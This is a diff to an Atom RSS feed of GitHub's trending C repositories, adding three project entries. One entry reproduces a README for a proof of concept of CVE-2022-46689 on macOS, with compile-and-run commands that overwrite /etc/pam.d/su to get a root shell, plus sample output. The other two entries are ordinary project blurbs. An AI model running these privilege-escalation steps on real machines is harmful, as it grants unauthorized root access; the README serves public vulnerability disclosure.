@@ -1,7 +1,28 @@
 <?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
   <title>GitHub C Daily Trending</title>
   <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
-  <updated>2022-12-20T01:31:22Z</updated>
+  <updated>2022-12-21T01:30:19Z</updated>
   <subtitle>Daily Trending of C in GitHub</subtitle>
   <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
+  <entry>
+    <title>zhuowei/MacDirtyCowDemo</title>
+    <updated>2022-12-21T01:30:19Z</updated>
+    <id>tag:github.com,2022-12-21:/zhuowei/MacDirtyCowDemo</id>
+    <link href="https://github.com/zhuowei/MacDirtyCowDemo" rel="alternate"></link>
+    <summary type="html">&lt;p&gt;Get root on macOS 13.0.1 with CVE-2022-46689 (macOS equivalent of the Dirty Cow bug), using the testcase extracted from Apple&#39;s XNU source.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;Get root on macOS 13.0.1 with &lt;a href=&#34;https://support.apple.com/en-us/HT213532&#34;&gt;CVE-2022-46689&lt;/a&gt; (macOS equivalent of the Dirty Cow bug), using the testcase extracted from &lt;a href=&#34;https://github.com/apple-oss-distributions/xnu/raw/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c&#34;&gt;Apple&#39;s XNU source&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://worthdoingbadly.com/macdirtycow/&#34;&gt;https://worthdoingbadly.com/macdirtycow/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;On a macOS 13.0.1 / 12.6.1 (or below) machine, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;clang -o switcharoo vm_unaligned_copy_switch_race.c&#xA;sed -e &#34;s/rootok/permit/g&#34; /etc/pam.d/su &amp;gt; overwrite_file.bin&#xA;./switcharoo /etc/pam.d/su overwrite_file.bin&#xA;su&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You should get:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% ./switcharoo /etc/pam.d/su overwrite_file.bin&#xA;Testing for 10 seconds...&#xA;RO mapping was modified&#xA;% su&#xA;sh-3.2# &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Tested on macOS 13 beta (22A5266r) with SIP off (it should still work with SIP on).&lt;/p&gt; &#xA;&lt;p&gt;If your system is fully patched (macOS 13.1 / 12.6.2), it should instead read:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./switcharoo /etc/pam.d/su overwrite_file.bin&#xA;Testing for 10 seconds...&#xA;vm_read_overwrite: KERN_SUCCESS:9865 KERN_PROTECTION_FAILURE:3840 other:0&#xA;Ran 13705 times in 10 seconds with no failure&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;and running &lt;code&gt;su&lt;/code&gt; should still ask for a password.&lt;/p&gt; &#xA;&lt;p&gt;Thanks to Sealed System Volume, running this on any file on the /System volume only modifies the file temporarily: It&#39;s reverted on reboot. Running it on a file on a writeable volume will preserve the modification after a reboot.&lt;/p&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Ian Beer of Project Zero for finding the issue. Looking forward to your writeup!&lt;/li&gt; &#xA; &lt;li&gt;Apple for the test case. (I didn&#39;t change anything: I just added the command line parameter to control what to overwrite.)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gts3.org/assets/papers/2020/jin:pwn2own2020-safari-slides.pdf&#34;&gt;SSLab@Gatech&lt;/a&gt; for the trick to disable password checking using &lt;code&gt;/etc/pam.d&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
+  </entry>
+  <entry>
+    <title>Kr328/clash-multiplatform-compat</title>
+    <updated>2022-12-21T01:30:19Z</updated>
+    <id>tag:github.com,2022-12-21:/Kr328/clash-multiplatform-compat</id>
+    <link href="https://github.com/Kr328/clash-multiplatform-compat" rel="alternate"></link>
+    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;</summary>
+  </entry>
+  <entry>
+    <title>streetpea/chiaki4deck</title>
+    <updated>2022-12-21T01:30:19Z</updated>
+    <id>tag:github.com,2022-12-21:/streetpea/chiaki4deck</id>
+    <link href="https://github.com/streetpea/chiaki4deck" rel="alternate"></link>
+    <summary type="html">&lt;p&gt;Fork of Chiaki (Open Source Playstation Remote Play) with Enhancements for Steam Deck and Documentation around how to use&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/streetpea/chiaki4deck/main/assets/chiaki_wide.png&#34; alt=&#34;Chiaki Logo&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;&lt;a href=&#34;https://streetpea.github.io/chiaki4deck/&#34;&gt;chiaki4deck&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;p&gt;An open source project looking to help users of the Steam Deck get the most out of Chiaki. &lt;a href=&#34;https://streetpea.github.io/chiaki4deck/&#34;&gt;Click here to see the accompanying site for documentation, updates and more&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; This project is not endorsed or certified by Sony Interactive Entertainment LLC.&lt;/p&gt; &#xA;&lt;p&gt;Chiaki is a Free and Open Source Software Client for PlayStation 4 and PlayStation 5 Remote Play for Linux, FreeBSD, OpenBSD, Android, macOS, Windows, Nintendo Switch and potentially even more platforms.&lt;/p&gt;</summary>
+  </entry>
 </feed>
